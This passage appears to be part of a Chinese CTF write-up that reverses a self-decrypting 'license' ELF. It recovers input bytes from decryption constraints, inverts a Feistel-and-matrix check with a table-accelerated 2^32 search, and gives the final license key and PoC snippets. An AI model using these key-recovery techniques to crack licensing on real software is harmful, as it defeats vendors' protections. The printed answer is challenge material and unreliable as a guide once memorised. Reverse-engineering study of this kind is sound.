```
syscall
mov word ptr [r12 + 0x56], ax
```

若模拟器在syscall后立即恢复密文并调度，就会漏掉这条保存指令。还需要更新syscall相关的RCX和R11。测试代码已并入分析流程。

#### 从输入相关的解密约束恢复后半段

提取轨迹时，会遇到以下模式：

```
movzx eax, byte ptr [r12 + input_offset]
movzx ecx, word ptr [r12 + 0x0a]
xor cl, al
mov word ptr [r12 + 0x0a], cx
```

这意味着输入字节直接进入后续指令的解密状态。错误输入造成的现象是后续代码解密成乱码，而不只是跳到一个失败分支。

对这种单字节约束，可以保存当前寄存器、内存和栈状态，然后枚举AL，循环见第4.2节。

筛选时结合目标地址与连续指令结构，并继续执行验证。随机字节也可能解码成合法x86指令，所以“能被反汇编”本身不足以证明候选正确。

例如，输入第24字节的相关轨迹是：

```
0x4122b4  movzx eax, byte ptr [r12 + 0x78]
0x4122c4  movzx ecx, word ptr [r12 + 0x0a]
0x4122d8  xor cl, al
0x4122e6  mov word ptr [r12 + 0x0a], cx
0x4122f1  mov edx, eax
```

输入位于 `r12+0x60` ，所以 `+0x78` 对应 `license[24]` 。该位置恢复出的值为 `0x00` 。

下一字节在 `0x4130dd` 从 `r12+0x79` 读取；其约束恢复出 `0x80` 。同样处理后续位置，得到后24字节：

```
00 80 0c c0 20 e0 01 01
60 0c 20 e0 00 80 0c a1
40 40 e0 1a 03 82 60 e0
```

十六进制形式为：

```
00800cc020e00101600c20e000800ca14040e01a038260e0
```

这里还穿插着使用内部状态字节的解密约束。必须按数据来源区分它们与输入字节约束，不能把所有枚举结果直接拼接成license。gates.json保存了本次提取出的地址和值。

#### 前半段的Feistel与线性混合

前24字节记为X。隐藏指令把它分成两个12字节部分L和R，执行三轮Feistel：

```
L_next = R
R_next = L XOR F_i(R)
```

每轮的F_i又按4字节分成三个独立分组。对每个分组，轮函数可以写成：

```
F_i(x) = x XOR g_i(x)
g_i(x) = Q_i · S(P_i · x XOR k_i)
```

其中S对每个字节独立查表；P_i、Q_i是4×4的可逆二进制矩阵。矩阵作用于字节向量，系数为1时异或对应字节，并非普通整数矩阵乘法。

从轨迹恢复这些矩阵的方法是记录每条字节异或的依赖关系。例如：

```
movzx eax, byte ptr [r12 + 0x9c]
xor al, byte ptr [r12 + 0x9d]
xor al, byte ptr [r12 + 0x9e]
xor al, byte ptr [r12 + 0x9f]
xor al, 0xd6
add eax, 0x300
movzx eax, byte ptr [rdi + rax]
```

这一段对应S-box的一个输入：

```
S(x0 XOR x1 XOR x2 XOR x3 XOR 0xd6)
```

查表前的异或关系给出P的一行和轮常量；查表后，各个临时字节如何异或到结果中，给出Q。

三轮Feistel结束后，程序再异或原输入：

```
Y = Feistel3(X) XOR X
```

之后对Y进行一个24×24二进制矩阵M的线性混合。中间穿插了用于调度状态的掩码操作，还原后，前半段的比较条件是：

```
M · Y = target
```

例如第一输出字节的关系为：

```
out[0] = Y[3] XOR Y[5] XOR Y[7] XOR Y[8]
       XOR Y[9] XOR Y[10] XOR Y[13] XOR Y[16]
       XOR Y[17] XOR Y[18] XOR Y[23]
```

从连续的movzx、xor、mov序列提取全部24行，再做GF(2)高斯消元，得到：

```
Y = M^-1 · target
  = 8721a19db336fdb91f3f6f5b9a2adcdc0b53034b6a8a0324
```

M会混合三个分组，但求逆后，剩下的Feistel方程又分解成三个互不依赖的问题。每个问题涉及L中的4字节和R中对应的4字节。

#### 把每组八字节未知量降为四字节

直接对每组8字节输入搜索需要枚举64位。利用轮函数的可逆部分，可以把搜索变量缩减到32位。

以下只考虑一个分组，所有变量都是4字节向量。定义：

```toml
U = R
V = L XOR F_1(U)
W = U XOR F_2(V)
```

三轮Feistel的输出为：

```
L3 = W
R3 = V XOR F_3(W)
```

将该分组的已知Y分成yL、yR，则：

```
yL = W XOR L
yR = V XOR F_3(W) XOR U
```

代入 `F_i(x) = x XOR g_i(x)` ，引入新的4字节变量：

```
t = U XOR V XOR W
```

由上述等式依次得到：

```
g_1(U) = t XOR yL
g_2(V) = t
g_3(W) = t XOR yR
```

由于P、Q和S都可逆：

```
g_i^-1(z) = P_i^-1 · (S^-1(Q_i^-1 · z) XOR k_i)
```

所以U、V、W都能表示成t的函数：

```toml
U = g_1^-1(t XOR yL)
V = g_2^-1(t)
W = g_3^-1(t XOR yR)
```

只需枚举32位t，检查：

```
g_1^-1(t XOR yL)
XOR g_2^-1(t)
XOR g_3^-1(t XOR yR)
XOR t
== 0
```

命中后恢复原输入：

```
R = U
L = W XOR yL
```

注意k_i在逆变换中的位置：先应用逆S-box，再异或k_i，最后乘P_i^-1。

#### 查表加速枚举

设t的四个字节为a、b、c、d。由于矩阵系数都是0或1，每次逆S-box的输入都是这四个字节某个子集的异或，再异或一个常量。

用四位mask表示这个子集。例如：

```
0001 → a
0011 → a XOR b
1101 → a XOR c XOR d
```

把相同mask的贡献合并，就能预先构造 `T[16][256]` 。每项保存对应查表结果对整个32位方程的贡献，包括逆矩阵、轮常量以及最后的t项。

固定a、b后，把表项按是否含c、d分组，检查式变成：

```
A XOR B[c] XOR C[d] XOR D[c XOR d] == 0
```

因此，最内层只剩三次表访问和几次异或，内层循环见第4.3节。

这里仍是每组2^32的枚举，只是将复杂变换移到了预计算阶段。实现使用GCC `-O3 -march=native` ，并用OpenMP并行处理a、b。无需在Python中执行数十亿次循环。

三组搜索得到以下t候选，按a、b、c、d的字节顺序展示：

| 分组  | t候选 |
| --- | --- |
| 0   | `dd49ccc1`<br><br>、 `56d7bfb2` |
| 1   | `2a0d6756`<br><br>、 `80ca848b` 、 `77f7c9b8` |
| 2   | `11d92447` |

这产生2×3×1＝6个前半段候选。前半段的数学条件不足以唯一决定完整程序的输出，因此需要把六个候选分别与已恢复的后半段拼接，送入原始ELF验证。

#### 原程序验证与最终结果

六个候选中，只有以下前24字节通过完整程序验证：

```
5b6c94d31d85e2344e666179a1d203ef02b5fdcb271d3d05
```

完整license为：

```
5b6c94d31d85e2344e666179a1d203ef02b5fdcb271d3d0500800cc020e00101600c20e000800ca14040e01a038260e0
```

将它写入文件，在Linux中执行：

```
./license < valid_license.txt
```

原始程序输出：

```
please input your license: flag{...}
```

其余五个候选均输出 `Rejected.`。验证过程没有修改原始ELF，也没有修改最终比较结果。

### 4\. PoC

```python
import math
import struct

raw = open('license', 'rb').read()

def decode(start, count):
    out = []
    for i in range(start, start + count):
        x = struct.unpack_from('<f', raw, 0x10d8a0 + 4*i)[0]
        out.append(round(math.asin(x) * 256) & 0xff)
    return bytes(out)

sbox = decode(0x12a, 256)
target = decode(0x22a, 24)
```

```
for value in range(256):
    restore_snapshot()
    set_al(value)
    run_until_next_decrypted_instruction()
    inspect_destination_and_instruction()
```

```r
for (unsigned c = 0; c < 256; c++) {
    unsigned base = A ^ B[c];
    for (unsigned d = 0; d < 256; d++) {
        if ((base ^ C[d] ^ D[c ^ d]) == 0) {
            /* 保存 a、b、c、d */
        }
    }
}
```

* * *
